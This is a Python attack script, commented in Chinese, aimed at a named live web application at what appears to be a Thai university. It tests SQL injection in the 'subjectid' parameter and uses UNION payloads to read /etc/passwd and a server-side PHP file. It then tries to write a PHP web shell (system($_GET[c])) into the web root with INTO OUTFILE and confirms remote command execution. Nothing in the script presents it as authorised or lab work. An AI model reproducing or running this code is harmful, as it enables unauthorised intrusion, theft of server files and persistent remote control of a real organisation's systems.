#!/usr/bin/env python3
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/enmeeting/getmobilesubject.php"

print("[*] 测试SQL注入漏洞...")

# Boolean-based SQL注入测试
test1 = requests.get(url, params={"subjectid": "1' AND 1=1--"}, verify=False, timeout=5)
test2 = requests.get(url, params={"subjectid": "1' AND 1=2--"}, verify=False, timeout=5)

if len(test1.text) != len(test2.text):
    print("[+] Boolean-based SQL注入存在!")
    print(f"    正常响应长度: {len(test1.text)}")
    print(f"    异常响应长度: {len(test2.text)}")

# UNION注入测试
union_payloads = [
    "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--",
    "1' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
    "1' UNION SELECT 'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q'--",
]

for payload in union_payloads:
    resp = requests.get(url, params={"subjectid": payload}, verify=False, timeout=5)
    if "SUBJECT_ID" in resp.text or len(resp.text) > 100:
        print(f"[+] UNION注入成功: {payload[:50]}...")
        print(f"    响应: {resp.text[:200]}")
        
        # 尝试读取文件
        file_payload = "1' UNION SELECT LOAD_FILE('/etc/passwd'),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--"
        resp2 = requests.get(url, params={"subjectid": file_payload}, verify=False, timeout=5)
        if "root:" in resp2.text:
            print("[+] 可以读取文件!")
            print(resp2.text[:500])
            
            # 尝试读取x.php
            xphp_payload = "1' UNION SELECT LOAD_FILE('/var/www/html/banpot/scmeeting/x.php'),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--"
            resp3 = requests.get(url, params={"subjectid": xphp_payload}, verify=False, timeout=5)
            if "<?php" in resp3.text:
                print("[+] 读取x.php成功!")
                print("="*70)
                print(resp3.text)
                print("="*70)
                exit(0)
        break

# 尝试写入文件（即使secure_file_priv限制，也可能有例外）
write_payloads = [
    "1' UNION SELECT '<?php system($_GET[c]); ?>',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 INTO OUTFILE '/var/www/html/enmeeting/shell.php'--",
    "1' UNION SELECT '<?php system($_GET[c]); ?>',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17 INTO DUMPFILE '/var/www/html/enmeeting/shell.php'--",
]

for payload in write_payloads:
    resp = requests.get(url, params={"subjectid": payload}, verify=False, timeout=5)
    # 检查shell是否写入
    test_shell = requests.get("https://olympic.su.ac.th/enmeeting/shell.php?c=id", verify=False, timeout=5)
    if "uid=" in test_shell.text:
        print(f"[+] Shell写入成功: https://olympic.su.ac.th/enmeeting/shell.php?c=id")
        exit(0)

print("[-] SQL注入测试完成")
